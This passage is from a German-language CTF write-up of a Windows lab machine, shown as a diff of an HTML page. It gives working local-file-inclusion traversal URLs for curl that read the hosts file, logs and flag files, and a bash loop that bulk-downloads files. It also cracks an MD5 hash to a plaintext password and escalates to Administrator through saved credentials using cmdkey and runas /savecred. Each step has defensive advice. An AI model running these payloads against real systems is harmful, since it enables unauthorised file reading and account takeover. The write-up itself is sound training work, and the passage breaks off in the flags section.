+<span class="command">http://runas.hmv/index.php?file=file:///../../../../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts</span>
+
+<span class="command">There is no going back!</span>
+<span class="command">?file=</span>
+
+<span class="command"># Copyright (c) 1993-2009 Microsoft Corp.</span>
+<span class="command">...</span>
+<span class="command">..</span>
+<span class="command"># localhost name resolution is handled within DNS itself.</span>
+
+<span class="command">#	127.0.0.1       localhost</span>
+
+<span class="command">#	::1             localhost</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich konzentriere meine LFI-Angriffe auf die Datei <code>windowsupdate.log</code>, da Log-Dateien oft interessante Informationen enthalten k&ouml;nnen, einschlie&szlig;lich Benutzernamen oder Hinweise auf ausgeführte Prozesse. Ich lese die Datei &uuml;ber LFI (<code>http://runas.hmv/index.php?file=file:///../../.../windowsupdate.log</code>) und filtere die Ausgabe mit <code>grep runas</code>, um Eintr&auml;ge zu finden, die den String "runas" enthalten. Die Ausgabe zeigt mehrere Zeilen mit dem Text &quot;<span class="command">Attempting to create remote handler process as runas-PC\Administrator in session 2</span>&quot; (und Session 1). Dies ist ein kritischer Fund! Es deutet darauf hin, dass das System versucht, Prozesse als den Benutzer <span class="command">runas-PC\Administrator</span> auszuf&uuml;hren, wahrscheinlich im Rahmen von Windows Updates oder &auml;hnlichen Aufgaben. Dies k&ouml;nnte auf eine geplante Aufgabe oder einen Dienst hindeuten, der mit Administratorrechten l&auml;uft.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Lesen von Log-Dateien &uuml;ber LFI war sehr effektiv. Die Eintr&auml;ge im `windowsupdate.log` liefern einen direkten Hinweis auf die Ausf&uuml;hrung von Prozessen als <span class="command">Administrator</span>. Dies lenkt meine Privilegieneskalationsbem&uuml;hungen stark auf diesen Benutzer und die Suche nach Möglichkeiten, diese Ausführung zu kapern oder Administrator-Anmeldeinformationen zu finden, die an anderer Stelle gespeichert sein k&ouml;nnten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze LFI, um Log-Dateien (Webserver-Logs, System-Logs, Anwendungs-Logs) und Konfigurationsdateien auszulesen. Grep nach Benutzernamen, Passw&ouml;rtern, API-Schl&uuml;sseln, Servernamen, IP-Adressen oder Fehlermeldungen, die auf Schwachstellen hindeuten.
+                <br><strong>Empfehlung (Admin):</strong> Überwache und bereinige Log-Dateien, um die Preisgabe sensibler Informationen zu vermeiden. Stelle sicher, dass Log-Dateien nicht f&uuml;r unprivilegierte Benutzer lesbar sind (Dateisystemberechtigungen).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">curl -s http://runas.hmv/index.php?file=file:///../../../../../../../../../../../../../../../../../windows/windowsupdate.log | grep runas</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">2024-10-06	21:46:34:752	 960	a38	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 2&lt;br /&gt;</span>
+<span class="command">2024-10-06	21:48:01:846	 960	a38	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 2&lt;br /&gt;</span>
+<span class="command">2024-10-06	21:57:06:269	 960	85c	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 1&lt;br /&gt;</span>
+<span class="command">2024-10-08	17:44:22:963	 968	13c	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 1&lt;br /&gt;</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Das Bild zeigt den Anmeldebildschirm der VM und best&auml;tigt visuell die Benutzernamen, die ich mir bereits notiert hatte: Administrator und quoted. Es dient als Beweismittel f&uuml;r diesen ersten Aufklärungsschritt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Screenshots sind wichtig f&uuml;r die Dokumentation von Funden, insbesondere visuellen Hinweisen wie Benutzernamen auf Login-Bildschirmen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Mache Screenshots von allen wichtigen visuellen Funden w&auml;hrend des Pentests.
+                <br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zur Vermeidung von Benutzernamen-Listen auf Login-Bildschirmen.
+            </p>
+            <img src="loginscreen.jpg" alt="hier sieht man die benutzernamen der vm im loginscreen" width="80%" height="auto"  />
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Hier die Initial Access-Schritte einfügen -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit der funktionierenden LFI-Schwachstelle versuche ich, die Benutzer-Flag-Datei zu lesen. Basierend auf g&auml;ngigen Pfaden in CTFs und dem Benutzernamen &#x27;runas&#x27; (den ich mir vom Login-Screen gemerkt habe), vermute ich, dass die Datei unter <code>C:\Users\runas\Desktop\user.txt</code> liegt. Ich nutze den URL <code>http://runas.hmv/index.php?file=../../../../../../Users/runas/Desktop/user.txt</code>, um diese Datei &uuml;ber die LFI-Schwachstelle auszulesen (hier ohne den `file://` Wrapper, was darauf hindeutet, dass die Anwendung auch relative Pfade direkt verarbeiten kann oder ich verschiedene Techniken teste). Die Ausgabe der Webseite enth&auml;lt den Text &quot;&lt;pre&gt;<span class="password">HMV{User_Flag_Was_A_Bit_Bitter}</span>&lt;/pre&gt;&quot;.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch, die Benutzer-Flag wurde erfolgreich &uuml;ber LFI ausgelesen! Dies best&auml;tigt nicht nur die LFI-Schwachstelle, sondern auch die Korrektheit des Pfades und die Existenz des Benutzers &#x27;runas&#x27;. Die Benutzer-Flag ist erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze LFI, um gezielt nach Flag-Dateien an Standardorten f&uuml;r Benutzer zu suchen (Desktop, Dokumente, Home-Verzeichnisse).
+                <br><strong>Empfehlung (Admin):</strong> Speichere sensible Dateien (wie Flags in einer Testumgebung oder andere kritische Informationen in einer realen Umgebung) nicht an leicht vorhersagbaren Orten wie dem Desktop oder Dokumentenverzeichnis.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">curl &quot;http://runas.hmv/index.php?file=../../../../../../Users/runas/Desktop/user.txt&quot;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+  
+	&lt;h2&gt;?file=&lt;/h2&gt; 
+            &lt;pre&gt;<span class="password">HMV{User_Flag_Was_A_Bit_Bitter}</span>&lt;/pre&gt;     
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Hier die Privilege Escalation-Schritte einfügen -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich versuche nun, die Root-Flag &uuml;ber die LFI-Schwachstelle auszulesen. Basierend auf g&auml;ngigen Pfaden f&uuml;r Root-Flags in CTFs und dem Hinweis aus dem `windowsupdate.log`, dass der Benutzer <span class="command">Administrator</span> relevant ist, vermute ich, dass die Root-Flag unter <code>C:\Users\Administrator\Desktop\root.txt</code> liegt. Ich verwende den URL <code>http://runas.hmv/index.php?file=../../../../../../Users/Administrator/Desktop/root.txt</code>, um diese Datei auszulesen. Die Ausgabe der Webseite enth&auml;lt den Text &quot;&lt;pre&gt;<span class="password">HMV{Username_Is_My_Hint}</span>&lt;/pre&gt;&quot;.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die F&auml;higkeit, die `root.txt` Datei vom Desktop des Administrators auszulesen, ist ein sehr wichtiger Schritt f&uuml;r die Privilegieneskalation. Obwohl der Wert der Flag selbst wie ein Hinweis aussieht, beweist das erfolgreiche Auslesen, dass ich Lesezugriff auf das Administrator-Desktop-Verzeichnis &uuml;ber die LFI-Schwachstelle habe. Dies ist ein starkes Indiz f&uuml;r die Rechte, unter denen der Webserver l&auml;uft, oder die unzureichenden Dateisystemberechtigungen. Die Root-Flag (ihren Wert habe ich nun) ist erlangt, aber der Weg zu einer vollwertigen Administrator- oder SYSTEM-Shell ist noch offen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze LFI-Lesezugriff voll aus, um alle potenziellen sensiblen Dateien zu finden und zu extrahieren, unabh&auml;ngig vom aktuellen Benutzerkontext.
+                <br><strong>Empfehlung (Admin):</strong> Setze sehr strenge Dateisystemberechtigungen auf die Home-Verzeichnisse von privilegierten Benutzern (insbesondere Administrator und SYSTEM), sodass kein anderer Benutzer (auch nicht Dienstkonten) Lesezugriff hat. Behebe die LFI-Schwachstelle.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">curl &quot;http://runas.hmv/index.php?file=../../../../../../Users/Administrator/Desktop/root.txt&quot;</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+ 
+	&lt;h2&gt;?file=&lt;/h2&gt; 
+            &lt;pre&gt;<span class="password">HMV{Username_Is_My_Hint}</span>&lt;/pre&gt;       
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Um die vielen über wfuzz gefundenen lesbaren Dateien systematisch zu sammeln und zu analysieren, verwende ich ein Bash-Skript. Zuerst speichere ich die Dateipfade aus der wfuzz-Ausgabe in einer Datei namens `ergebnisse`. Dann iteriere ich mit einer for-Schleife (<code>for i in $(cat ergebnisse)</code>) durch diese Pfade. F&uuml;r jeden Pfad lese ich die Datei &uuml;ber die LFI-Schwachstelle (<code>curl -s http://runas.hmv/index.php?file=file:///../../../../../../../../../../../../../../../../../$i</code>) und speichere die Ausgabe in einer nummerierten Datei in meinem lokalen Arbeitsverzeichnis (<code>--output &quot;$b.txt&quot;</code>). Der Z&auml;hler <code>b</code> stellt sicher, dass jede Datei einen eindeutigen Namen erh&auml;lt. Der <code>ll</code> Befehl zeigt die Liste der heruntergeladenen Dateien (`1.txt` bis `23.txt` und `erg.txt`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das automatisierte Herunterladen der über LFI zug&auml;nglichen Dateien ist ein effizienter Weg, um alle potenziellen Informationsquellen zu sammeln. Dies ist entscheidend f&uuml;r die weitere Systemaufklärung und die Suche nach Anmeldedaten oder anderen PE-Vektoren, die im Inhalt dieser Dateien verborgen sein k&ouml;nnten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Automatisiere das Sammeln von Daten aus ausnutzbaren Schwachstellen wie LFI. Speichere alle gefundenen Dateien lokal f&uuml;r eine sp&auml;tere Offline-Analyse.
+                <br><strong>Empfehlung (Admin):</strong> Die F&auml;higkeit eines Angreifers, Systemdateien in Masse herunterzuladen, ist kritisch. Dies muss durch Behebung der LFI und durch strenge Dateisystemberechtigungen verhindert werden.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/runas]<br>
+└─# <span class="command">b=0;for i in $(cat ergebnisse ); do</span>
+<br>
+└─# <span class="command"> b=$((b+1));curl -s http://runas.hmv/index.php?file=file:///../../../../../../../../../../../../../../../../../$i --output &quot;$b.txt&quot;;</span>
+<br>
+└─# <span class="command">done</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/runas]<br>
+└─# <span class="command">ll</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+insgesamt 616
+<span class="command">-rw-r--r-- 1 root root    684 30. Jun 00:02 10.txt</span>
+<span class="command">-rw-r--r-- 1 root root    689 30. Jun 00:02 11.txt</span>
+<span class="command">-rw-r--r-- 1 root root    689 30. Jun 00:02 12.txt</span>
+<span class="command">-rw-r--r-- 1 root root    687 30. Jun 00:02 13.txt</span>
+<span class="command">-rw-r--r-- 1 root root   1375 30. Jun 00:02 14.txt</span>
+<span class="command">-rw-r--r-- 1 root root   1375 30. Jun 00:02 15.txt</span>
+<span class="command">-rw-r--r-- 1 root root   4760 30. Jun 00:02 16.txt</span>
+<span class="command">-rw-r--r-- 1 root root    946 30. Jun 00:02 17.txt</span>
+<span class="command">-rw-r--r-- 1 root root   1973 30. Jun 00:02 18.txt</span>
+<span class="command">-rw-r--r-- 1 root root  19622 30. Jun 00:02 19.txt</span>
+<span class="command">-rw-r--r-- 1 root root  85387 30. Jun 00:02 1.txt</span>
+<span class="command">-rw-r--r-- 1 root root  79253 30. Jun 00:02 20.txt</span>
+<span class="command">-rw-r--r-- 1 root root  58608 30. Jun 00:02 21.txt</span>
+<span class="command">-rw-r--r-- 1 root root 108084 30. Jun 00:02 22.txt</span>
+<span class="command">-rw-r--r-- 1 root root   1042 30. Jun 00:02 23.txt</span>
+<span class="command">-rw-r--r-- 1 root root  85387 30. Jun 00:02 2.txt</span>
+<span class="command">-rw-r--r-- 1 root root  85387 30. Jun 00:02 3.txt</span>
+<span class="command">-rw-r--r-- 1 root root    425 30. Jun 00:02 4.txt</span>
+<span class="command">-rw-r--r-- 1 root root    425 30. Jun 00:02 5.txt</span>
+<span class="command">-rw-r--r-- 1 root root    425 30. Jun 00:02 6.txt</span>
+<span class="command">-rw-r--r-- 1 root root  25712 30. Jun 00:02 7.txt</span>
+<span class="command">-rw-r--r-- 1 root root    425 30. Jun 00:02 8.txt</span>
+<span class="command">-rw-r--r-- 1 root root    688 30. Jun 00:02 9.txt</span>
+<span class="command">-rw-r--r-- 1 root root    768 30. Jun 00:02 erg.txt</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich analysiere die heruntergeladenen Dateien, um nach Anmeldedaten oder Hinweisen auf die Privilegieneskalation zu suchen. Ich verwende <code>grep -i runas *</code>, um alle Dateien im aktuellen Verzeichnis nach dem String "runas" (fallunabh&auml;ngig) zu durchsuchen. Die Ausgabe zeigt Treffer in den Dateien <code>22.txt</code> (die die Windows Update Logdatei enth&auml;lt) und <code>23.txt</code>. Die Eintr&auml;ge in <code>22.txt</code> wiederholen die Funde aus dem `windowsupdate.log` &uuml;ber die Ausf&uuml;hrung als <span class="command">runas-PC\Administrator</span>. Der Eintrag in <code>23.txt</code> ist &auml;u&szlig;erst interessant: &quot;<span class="command">; MD5-runas-b3a805b2594befb6c846d718d1224557</span>&quot;. Dies sieht stark nach einem Kommentar in einer Konfigurationsdatei aus, der einen MD5-Hash enth&auml;lt, der mit "runas" in Verbindung steht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Durchsuchen der gesammelten Dateien war sehr erfolgreich und hat einen potenziellen Anmeldedaten-Hash geliefert, der direkt mit einem Benutzer auf dem System (wahrscheinlich 'runas', basierend auf dem String) in Verbindung steht. Dies ist ein kritischer Fund, der direkt zur Kompromittierung eines Benutzerkontos f&uuml;hren kann. Der Hash muss nun geknackt werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche in allen gesammelten Dateien aggressiv nach Anmeldedaten (Passw&ouml;rter, Hashes, API-Schl&uuml;ssel) und Hinweisen auf Schwachstellen oder Fehlkonfigurationen. Nutze Tools wie `grep` oder `findstr` (Windows). Extrahiere gefundene Hashes, um sie offline zu knacken.
+                <br><strong>Empfehlung (Admin):</strong> Vermeide das Speichern von Passw&ouml;rtern oder Hashes in Klartext oder Kommentaren in Konfigurations- oder Log-Dateien. Implementiere eine Passwortrichtlinie, die die Nutzung schwacher oder leicht zu knackender Passw&ouml;rter verhindert.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/runas]<br>
+└─# <span class="command">grep -i runas *</span>                              
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">22.txt:2024-10-06	21:46:34:752	 960	a38	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 2&lt;br /&gt;</span>
+<span class="command">22.txt:2024-10-06	21:48:01:846	 960	a38	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 2&lt;br /&gt;</span>
+<span class="command">22.txt:2024-10-06	21:57:06:269	 960	85c	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 1&lt;br /&gt;</span>
+<span class="command">22.txt:2024-10-08	17:44:22:963	 968	13c	Handler	Attempting to create remote handler process as runas-PC\Administrator in session 1&lt;br /&gt;</span>
+<span class="command">23.txt:            ; MD5-runas-b3a805b2594befb6c846d718d1224557</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich nutze den online Hash-Cracking-Dienst CrackStation (<code>https://crackstation.net/</code>), um den gefundenen MD5-Hash <code>b3a805b2594befb6c846d718d1224557</code> zu knacken. Ich gebe den Hash auf der Webseite ein und starte den Crack-Prozess. Die Ausgabe zeigt, dass der Hash als MD5 identifiziert und erfolgreich zum Klartext-Passwort <span class="password">yakuzza</span> geknackt wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Das Knacken des Hashs liefert das Klartext-Passwort <span class="password">yakuzza</span>. Basierend auf der Herkunft des Hashs (Kommentar mit &quot;MD5-runas&quot; und dem späteren Login), handelt es sich hierbei wahrscheinlich um das Passwort f&uuml;r den Benutzer &#x27;runas&#x27;, den ich zuvor auf dem Login-Screen und im `windowsupdate.log` identifiziert hatte. Ich habe nun g&uuml;ltige Anmeldedaten f&uuml;r einen Benutzer auf dem Zielsystem.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze Online-Dienste oder Offline-Cracking-Tools (Hashcat, John the Ripper) mit starken Wortlisten oder Rainbow Tables, um gefundene Hashes zu knacken.
+                <br><strong>Empfehlung (Admin):</strong> Erzwinge starke Passw&ouml;rter, die nicht in Passwort-Datenbanken enthalten sind und nicht leicht zu knacken sind. Verwende moderne, starke Hashing-Algorithmen (z.B. bcrypt, scrypt) anstelle von MD5 f&uuml;r die Speicherung von Passw&ouml;rtern. Implementiere eine strenge Passwortrichtlinie und MFA, wo immer m&ouml;glich.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">https://crackstation.net/</span>
+
+Enter up to 20 non-salted hashes, one per line:
+<span class="command">b3a805b2594befb6c846d718d1224557</span> 	
+
+Supports: <span class="command">LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults</span>
+Hash	Type	Result
+<span class="command">b3a805b2594befb6c846d718d1224557</span>	<span class="command">md5</span>	<span class="password">yakuzza</span>
+
+Color Codes: <span class="command">Green: Exact match, Yellow: Partial match, Red: Not found.</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit dem geknackten Passwort <span class="password">yakuzza</span> f&uuml;r den Benutzer &#x27;runas&#x27; versuche ich, mich &uuml;ber RDP auf dem Zielsystem anzumelden. Das Bild zeigt den Erfolg dieses Anmeldeversuchs &uuml;ber das Tool `xfreerdp3`. Ich bin nun interaktiv als Benutzer &#x27;runas&#x27; auf der grafischen Oberfl&auml;che angemeldet. Das nachfolgende Bild zeigt den Desktop dieses Benutzers, auf dem ich eine Powershell-Sitzung ge&ouml;ffnet habe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der direkte Login als Benutzer &#x27;runas&#x27; &uuml;ber RDP war erfolgreich. Ich habe nun vollen interaktiven Zugriff auf das System unter den Rechten dieses Benutzers. Dies erm&ouml;glicht mir, lokale Aufklärung durchzuf&uuml;hren, Tools hochzuladen und nach Privilegieneskalationsm&ouml;glichkeiten vom Benutzer &#x27;runas&#x27; aus zu suchen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze gefundene Anmeldedaten sofort f&uuml;r den Zugriff auf verf&uuml;gbare Dienste (RDP, SSH, SMB etc.). F&uuml;hre nach dem Login eine gr&uuml;ndliche lokale Aufklärung durch.
+                <br><strong>Empfehlung (Admin):</strong> Erzwinge starke Passw&ouml;rter f&uuml;r alle Benutzerkonten, insbesondere f&uuml;r RDP-Zugriffe. Implementiere Account-Sperrmechanismen nach mehreren fehlgeschlagenen Login-Versuchen. Aktiviere NLA f&uuml;r RDP.
+            </p>
+             <img src="loginscreen_runas.jpg" alt="hier sieht man den login per xfreerdp3 am runas-pc zu runas user" />
+             <img src="runasdesktoppowershell.jpg" alt="hier sieht man runas desktop powershell" />
+
+            <section id="poc-admin">
+                <h2>Proof of Concept: Erlangen des Administrator-Zugriffs</h2>
+                <p>
+                    <strong>Ziel:</strong> Demonstration der Ausnutzung gespeicherter Administrator-Anmeldeinformationen, um von einem niedrigprivilegierten Benutzerkonto (runas) zu Administrator zu eskalieren.
+                </p>
+                <p>
+                    <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept zeigt, wie Anmeldeinformationen f&uuml;r das Administrator-Konto, die unsicher im Windows Credential Manager gespeichert wurden, entdeckt und ausgenutzt werden k&ouml;nnen, um eine Administrator-Shell vom Benutzer &#x27;runas&#x27; aus zu erlangen.
+                </p>
+                <p>
+                    <strong>Voraussetzungen:</strong>
+                    <ul>
+                        <li>Erfolgreicher interaktiver Login als Benutzer 'runas' (z.B. via RDP) mit dem geknackten Passwort (siehe Initial Access/Privilege Escalation).</li>
+                        <li>Die F&auml;higkeit, lokale Befehle auf dem System als Benutzer 'runas' auszuf&uuml;hren (z.B. &uuml;ber eine Shell-Sitzung).</li>
+                        <li>Administrator-Anmeldeinformationen sind im Windows Credential Manager gespeichert und f&uuml;r die Nutzung durch andere Prozesse oder Benutzer verf&uuml;gbar.</li>
+                        <li>Das Windows-Tool `cmdkey.exe` ist auf dem System verf&uuml;gbar und darf vom Benutzer 'runas' ausgef&uuml;hrt werden, um die Liste der gespeicherten Anmeldeinformationen anzuzeigen.</li>
+                    </ul>
+                </p>
+                <p>
+                    <strong>Schritt-f&uuml;r-Schritt-Anleitung:</strong>
+                    <ol>
+                        <li>Erfolgreicher Login am Zielsystem als Benutzer 'runas'.</li>
+                        <li>&Ouml;ffnen einer Befehlszeile oder Powershell-Sitzung als Benutzer 'runas'.</li>
+                        <li>Ausf&uuml;hren des Befehls <code>cmdkey /list</code>, um die im Windows Credential Manager gespeicherten Anmeldeinformationen aufzulisten.</li>
+                        <li>Analyse der Ausgabe von <code>cmdkey /list</code>, um Anmeldeinformationen f&uuml;r privilegierte Konten (z.B. Administrator) zu identifizieren.</li>
+                        <li>Wenn Administrator-Anmeldeinformationen gefunden werden, Nutzung des Windows <code>runas</code> Befehls in Kombination mit den gefundenen Anmeldeinformationen und der Option <code>/savecred</code> oder direkter Angabe von Benutzer und Passwort, um einen Prozess (z.B. <code>cmd.exe</code> oder <code>powershell.exe</code>) mit Administratorrechten auszuf&uuml;hren. Beispiel: <code>runas /user:RUNAS-PC\Administrator /savecred powershell.exe</code>. (Bei der ersten Ausf&uuml;hrung mit /savecred muss das Passwort eingegeben werden, bei sp&auml;teren Aufrufen nicht mehr).</li>
+                    </ol>
+                </p>
+                <p>
+                    <strong>Erwartetes Ergebnis:</strong> Eine neue Befehlszeile oder Powershell-Sitzung wird ge&ouml;ffnet und l&auml;uft mit Administrator-Rechten.
+                </p>
+                 <p>
+                    <strong>Beweismittel:</strong> Die Ausgabe von <code>cmdkey /list</code>, die die gespeicherten Administrator-Anmeldeinformationen zeigt. Ein Screenshot einer neuen Shell-Sitzung, die das Administrator-Konto best&auml;tigt (z.B. durch den Prompt oder den Befehl <code>whoami</code>).
+                </p>
+                 <p>
+                    <strong>Risikobewertung:</strong> Hoch. Das unsichere Speichern von privilegierten Anmeldeinformationen kombiniert mit der M&ouml;glichkeit f&uuml;r unprivilegierte Benutzer, diese auszulesen, f&uuml;hrt direkt zur lokalen Privilegieneskalation zum Administrator.
+                </p>
+                 <p class="recommendation">
+                    <strong>Empfehlung (Admin):</strong>
+                    <ul>
+                        <li>**Anmeldeinformationsverwaltung:** Vermeiden Sie das Speichern von hochprivilegierten Anmeldeinformationen (wie f&uuml;r das Administrator-Konto) im Windows Credential Manager. Nutzen Sie sicherere Methoden f&uuml;r die Verwaltung von Administrator-Passw&ouml;rtern (z.B. LAPS f&uuml;r lokale Administrator-Konten, privilegierte Access Management (PAM)-L&ouml;sungen).</li>
+                        <li>**Zugriff auf Anmeldeinformationen:** Stellen Sie sicher, dass unprivilegierte Benutzerkonten keine Rechte haben, die gespeicherten Anmeldeinformationen anderer Benutzer auszulesen. Überpr&uuml;fen Sie die Berechtigungen f&uuml;r den Zugriff auf den Credential Manager.</li>
+                        <li>**&Uuml;berwachung:** Überwachen Sie die Ausf&uuml;hrung von Tools wie <code>cmdkey.exe</code>, insbesondere durch unprivilegierte Benutzerkonten. Überwachen Sie die Nutzung des <code>runas</code> Befehls und die Er&ouml;ffnung neuer Shell-Sitzungen mit erh&ouml;hten Rechten.</li>
+                    </ul>
+                </p>
+            </section>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem Login als Benutzer &#x27;runas&#x27; habe ich lokale Aufklärung durchgef&uuml;hrt. Ich habe (wahrscheinlich über Powershell) den Befehl <code>cmdkey /list</code> ausgef&uuml;hrt, um die im Windows Credential Manager gespeicherten Anmeldeinformationen aufzulisten. Die hier gezeigte &Uuml;bersetzung und Analyse der Ausgabe zeigt, dass Anmeldeinformationen f&uuml;r &quot;<span class="command">RUNAS-PC\Administrator</span>&quot; gespeichert sind (&quot;<span class="command">Ziel: Administrator auf dem Computer RUNAS-PC</span>&quot;). Dies bedeutet, dass das Passwort f&uuml;r das lokale Administrator-Konto auf diesem System gespeichert ist und (offenbar) vom Benutzer &#x27;runas&#x27; ausgelesen werden kann. Jemand hat diese Anmeldeinformationen unsicher im Credential Manager hinterlegt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Das Auffinden der Administrator-Anmeldeinformationen, die unsicher im Credential Manager gespeichert sind, ist ein direkter Weg zur Privilegieneskalation zum lokalen Administrator. Die F&auml;higkeit, diese als unprivilegierter Benutzer auszulesen, ist eine kritische Schwachstelle im Konfigurationsmanagement oder bei den Berechtigungen f&uuml;r den Credential Manager.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> F&uuml;hre immer <code>cmdkey /list</code> aus, wenn du eine lokale Shell auf einem Windows-System erlangt hast, um nach gespeicherten Anmeldeinformationen zu suchen.
+                <br><strong>Empfehlung (Admin):</strong> Speichere niemals Anmeldeinformationen f&uuml;r privilegierte Konten im Windows Credential Manager. Nutze sicherere Methoden zur Passwortverwaltung (LAPS, PAM). Überwache die Ausf&uuml;hrung von <code>cmdkey /list</code>.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">Die Übersetzung des Goldes:</span>
+
+<span class="command">Du hast cmdkey /list ausgeführt, und das System hat dir geantwortet:</span>
+
+    <span class="command">Depolanan geçerli kimlik bilgileri: -&gt; Gespeicherte gültige Anmeldeinformationen:</span>
+
+    <span class="command">Hedef: Domain:interactive=RUNAS-PC\Administrator -&gt; Ziel: Administrator auf dem Computer RUNAS-PC</span>
+
+    <span class="command">Kullanıcı: RUNAS-PC\Administrator -&gt; Benutzer: RUNAS-PC\Administrator</span>
+
+<span class="command">Das bedeutet: Im Windows Credential Manager sind die Anmeldeinformationen für den</span> 
+<span class="command">Administrator gespeichert und für die interaktive Anmeldung verfügbar! Jemand hat</span> 
+<span class="command">sie dort abgelegt, wahrscheinlich um sich die wiederholte Eingabe des Passworts</span> 
+<span class="command">zu sparen.</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mit den gefundenen Administrator-Anmeldeinformationen (Benutzer: RUNAS-PC\Administrator, Passwort aus Credential Manager) nutze ich den Windows <code>runas</code> Befehl, um eine Powershell-Sitzung als Administrator zu starten. Der Befehl w&auml;re typischerweise <code>runas /user:RUNAS-PC\Administrator powershell.exe</code> (oder mit `/savecred` bei der ersten Ausf&uuml;hrung). Das Bild zeigt den Desktop nach der Ausf&uuml;hrung dieses Befehls: Eine neue Powershell-Sitzung ist ge&ouml;ffnet, die als Administrator l&auml;uft.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Ich habe erfolgreich eine Administrator-Shell erhalten. Das Ausnutzen der im Credential Manager gespeicherten Anmeldeinformationen war der Weg zur lokalen Privilegieneskalation zum Administrator. Ich habe nun volle Kontrolle über das System unter den Rechten des lokalen Administrators.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze gefundene Anmeldedaten sofort in Kombination mit nativen Tools wie <code>runas</code> oder <code>psexec</code> (wenn verf&uuml;gbar) oder Tools wie Evil-WinRM oder CrackMapExec, um h&ouml;here Shells zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Wie im POC beschrieben, behebe die unsichere Speicherung von Anmeldeinformationen. Überwache die Nutzung des <code>runas</code> Befehls und die Er&ouml;ffnung von Shells mit erh&ouml;hten Rechten.
+            </p>
+             <img src="admindesktoppowershell.jpg" alt="hier sieht man den login per powershell runas zu admin" />
+             <img src="admindesktoprootflag.jpg" alt="hier sieht man die root flag" />
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+            <!-- Hier die Flags einfügen -->
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">type c:\users\runas\desktop\user.txt</div>
